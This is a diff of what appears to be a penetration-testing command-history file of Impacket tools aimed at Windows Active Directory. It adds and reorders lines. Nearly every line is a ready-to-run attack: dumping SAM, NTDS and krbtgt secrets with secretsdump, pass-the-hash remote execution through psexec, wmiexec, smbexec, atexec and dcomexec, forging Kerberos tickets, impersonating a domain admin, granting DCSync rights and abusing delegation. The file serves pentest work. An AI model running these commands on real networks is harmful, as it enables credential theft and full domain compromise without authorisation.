@@ -6,16 +6,16 @@ reg.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET" backup -o '\\192.168.56.1\SHUTDOW
 smbserver.py -smb2support EXEGOL .
 secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL
 secretsdump -ntds ntds.dit.save -system system.save LOCAL
+secretsdump "$DOMAIN"/"$USER":"$PASSWORD"@"$DC_HOST"
 secretsdump -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$DC_HOST"
 secretsdump -k "$TARGET"
-secretsdump -k -outputfile "$DOMAIN" "$DC_HOST"
 secretsdump -ldapfilter '(&(objectCategory=person)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2))' -just-dc -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$DC_HOST"
 secretsdump -ldapfilter '(&(objectClass=user)(adminCount=1))' -just-dc -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 "$DOMAIN"/Administrator@"$DC_HOST"
 secretsdump -no-pass "$DOMAIN"/'DC01$'@"$DC_HOST"
 secretsdump -outputfile "$DOMAIN" -just-dc -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$DC_HOST"
 secretsdump -just-dc-user krbtgt -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$DC_HOST"
-KRB5CCNAME='domainadmin.ccache' secretsdump -just-dc-user 'krbtgt' -dc-ip "$DC_HOST" -k -no-pass @"$DC_HOST"
-KRB5CCNAME='COMPUTER.ccache' getST.py -self -impersonate 'domainadmin' -altservice "cifs/$TARGET" -k -no-pass -dc-ip "$DC_HOST" "$DOMAIN"/"$TARGET\$"
+KRB5CCNAME="$CCACHE_PATH" secretsdump -just-dc-user 'krbtgt' -dc-ip "$DC_HOST" -k -no-pass @"$DC_HOST"
+KRB5CCNAME="$CCACHE_PATH" getST.py -self -impersonate 'domainadmin' -altservice "cifs/$TARGET" -k -no-pass -dc-ip "$DC_HOST" "$DOMAIN"/"$TARGET\$"
 getST.py -self -impersonate 'domainadmin' -altservice "cifs/$TARGET" -k -no-pass -dc-ip "$DC_HOST" "$DOMAIN"/"$TARGET\$"
 getST.py -spn "host/$TARGET" -impersonate 'domainadmin' -dc-ip "$DC_IP" "$DOMAIN"/'EXEGOL-01$':'exegol4thewin'
 getST.py -spn CIFS/"$TARGET" -impersonate Administrator -dc-ip "$DC_IP" "$DOMAIN"/"$USER":"$PASSWORD"
@@ -43,31 +43,30 @@ GetUserSPNs.py -outputfile Kerberoastables.txt -no-preauth "$USER" -usersfile "s
 addcomputer.py -computer-name 'SHUTDOWN$' -computer-pass '123soleil!' -dc-host DC01 -domain-netbios "$DOMAIN" "$DOMAIN"/"$USER":"$PASSWORD"
 addcomputer.py -delete -computer-name 'SHUTDOWN$' -dc-host DC01 -domain-netbios "$DOMAIN" "$DOMAIN"/"$USER":"$PASSWORD"
 dacledit.py -action write -rights DCSync -principal 'owneduser' -target-dn 'DC=DOMAIN,DC=LOCAL' "$DOMAIN"/"$USER":"$PASSWORD"
+wmiexec.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
 wmiexec.py -codec cp850 -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
 wmiexec.py -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
 wmiexec.py -k "$TARGET"
 ticketer.py -nthash "$NT_HASH" -domain-sid S-1-5-11-39129514-1145628974-103568174 -domain "$DOMAIN" randomuser
 ticketer.py -nthash "$NT_HASH" -spn HOST/"$TARGET" -domain-sid "$DOMAIN_SID" -domain "$DOMAIN" randomuser
 smbclient.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
+smbexec.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
 smbexec.py -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
 smbexec.py -share 'ADMIN$' -k "$TARGET"
 rpcdump.py "$DC_HOST" | grep -A 6 MS-RPRN
 rbcd.py -delegate-from "$USER" -delegate-to 'sv01$' -dc-ip "$DC_IP" -action remove "$DOMAIN"/"$USER":"$PASSWORD"
 rbcd.py -delegate-from "$USER" -delegate-to 'sv01$' -dc-ip "$DC_IP" -action write "$DOMAIN"/"$USER":"$PASSWORD"
 rbcd.py -delegate-to 'sv01$' -dc-ip "$DC_IP" -action read "$DOMAIN"/"$USER":"$PASSWORD"
-proxychains psexec.py -no-pass "$DOMAIN"/"$USER"@"$TARGET"
-proxychains secretsdump -no-pass "$DOMAIN"/"$USER"@"$TARGET"
-proxychains smbexec.py -no-pass "$DOMAIN"/"$USER"@"$TARGET"
-proxychains wmiexec.py -no-pass "$DOMAIN"/"$USER"@"$TARGET"
-proxychains atexec.py -no-pass "$DOMAIN"/"$USER"@"$TARGET"
-proxychains dcomexec.py -no-pass "$DOMAIN"/"$USER"@"$TARGET"
-lookupsid.py -hashes :"$NT_HASH" "$DOMAIN"/Administrator@"$DC_HOST" 0
+lookupsid.py "$DOMAIN"/"$USER":"$PASSWORD"@"$DC_HOST" 0
+lookupsid.py -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$DC_HOST" 0
+psexec.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
 psexec.py -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
+dcomexec.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
 dcomexec.py -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
-dcomexec.py -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
+atexec.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
 atexec.py -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
 changepasswd.py -newpass '123Pentest!!!' "$DOMAIN"/"$USER":"$PASSWORD"@"$DC_HOST"
 changepasswd.py -newpass '123Pentest!!!' -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
 owneredit.py -action write -new-owner "$NEW_OWNER" -target "$TARGET_OBJECT" "$DOMAIN"/"$USER":"$PASSWORD"
 mssqlclient.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
-describeTicket.py "$KRB5CCNAME"
+describeTicket.py "$CCACHE_PATH"
